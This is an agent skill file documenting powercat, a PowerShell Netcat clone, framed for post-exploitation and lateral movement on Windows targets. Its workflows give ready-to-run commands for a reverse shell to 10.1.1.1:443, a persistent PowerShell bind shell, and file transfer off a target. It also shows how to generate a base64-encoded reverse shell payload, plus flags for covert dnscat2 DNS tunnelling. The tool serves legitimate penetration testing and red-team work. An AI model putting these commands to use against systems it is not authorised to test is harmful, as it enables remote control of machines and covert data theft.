---
name: powercat
description: A PowerShell implementation of Netcat that supports TCP, UDP, and DNS protocols. Use it for creating reverse shells, bind shells, file transfers, network relays, and covert DNS tunneling during post-exploitation or lateral movement on Windows systems.
---

# powercat

## Overview
powercat is a PowerShell-based networking utility that replicates and extends the functionality of Netcat. It allows for reading and writing data across network connections and includes advanced features like built-in relays, PowerShell execution, and a dnscat2 client. Category: Post-Exploitation / Windows Resources.

## Installation (if not already installed)
The tool is typically used as a PowerShell script on Windows targets. On Kali Linux, the script is located in the Windows resources directory.

```bash
sudo apt install powercat
```

To use it in PowerShell, you must first import the module:
```powershell
Import-Module /usr/share/powershell-modules/powercat/powercat.ps1
```
*Note: On a target Windows machine, you would typically download and dot-source the `powercat.ps1` file.*

## Common Workflows

### Reverse Shell
Connect back to a listener at 10.1.1.1 on port 443 and execute a command shell:
```powershell
powercat -c 10.1.1.1 -p 443 -e cmd
```

### Persistent PowerShell Listener (Bind Shell)
Listen on port 8000 and provide a PowerShell session that restarts after disconnection:
```powershell
powercat -l -p 8000 -ep -rep
```

### File Transfer
**Receiver (Listener):**
```powershell
powercat -l -p 4444 -of C:\outfile
```
**Sender (Client):**
```powershell
powercat -c 10.1.1.15 -p 4444 -i C:\inputfile
```

### TCP Relay
Relay traffic coming in on local port 8000 to a remote service at 10.1.1.1:9000:
```powershell
powercat -l -p 8000 -r tcp:10.1.1.1:9000
```

### Generate Encoded Payload
Create a base64 encoded command that executes a powercat reverse shell:
```powershell
powercat -c 10.1.1.1 -p 443 -e cmd -ge
```

## Complete Command Reference

### Mode Selection (Required)
| Flag | Description |
|------|-------------|
| `-c <ip>` | **Client Mode.** Provide the IP of the system to connect to. If using `-dns`, specify the DNS Server. |
| `-l` | **Listen Mode.** Start a listener on the port specified by `-p`. |

### Connection Options
| Flag | Description |
|------|-------------|
| `-p <port>` | **Port.** The port to connect to, or the port to listen on. |
| `-u` | **UDP Mode.** Send traffic over UDP instead of TCP. |
| `-t <int>` | **Timeout.** Seconds to wait before giving up. Default: 60. |
| `-rep` | **Repeater.** Continually restart after disconnection (persistent server). |
| `-d` | **Disconnect.** Disconnect after the connection is established and `-i` data is sent (useful for scanning). |

### Execution Options
| Flag | Description |
|------|-------------|
| `-e <proc>` | **Execute.** Specify the name of the process to start (e.g., `cmd`). |
| `-ep` | **Execute Powershell.** Start a pseudo powershell session. |

### Data Handling Options
| Flag | Description |
|------|-------------|
| `-i <input>` | **Input.** Data to send immediately (file path, byte array, or string). Supports piping. |
| `-o <type>` | **Output.** How to return info to console: `Bytes`, `String`, or `Host` (Default). |
| `-of <path>` | **Output File.** Path to a file to write received output to. |

### Relay Options
| Flag | Description |
|------|-------------|
| `-r <str>` | **Relay.** Relay traffic between two nodes. |
| | *Client Relay:* `-r <protocol>:<ip addr>:<port>` |
| | *Listener Relay:* `-r <protocol>:<port>` |
| | *DNSCat2 Relay:* `-r dns:<dns server>:<dns port>:<domain>` |

### DNS Options (dnscat2)
| Flag | Description |
|------|-------------|
| `-dns <domain>` | **DNS Mode.** Use dnscat2 covert channel. Specify DNS server in `-c` and port in `-p`. |
| `-dnsft <int>` | **DNS Failure Threshold.** Number of bad packets allowed before exiting. |

### Payload Generation
| Flag | Description |
|------|-------------|
| `-g` | **Generate Payload.** Returns a script string executing the specified options. |
| `-ge` | **Generate Encoded Payload.** Returns a base64 string for `powershell -E <string>`. |

### Miscellaneous
| Flag | Description |
|------|-------------|
| `-v` | **Verbose.** Enable verbose output. |
| `-h` | **Help.** Print the help message. |

## Notes
- **PowerShell Session Limits:** When using `-ep`, entering interactive sub-shells (like `nslookup` or `netsh`) will cause the session to hang.
- **UDP Behavior:** In UDP mode, the client must send data first before the server can respond.
- **DNS Mode:** The `-dns` flag only implements the client-side of dnscat2. A dnscat2 server is required on the receiving end.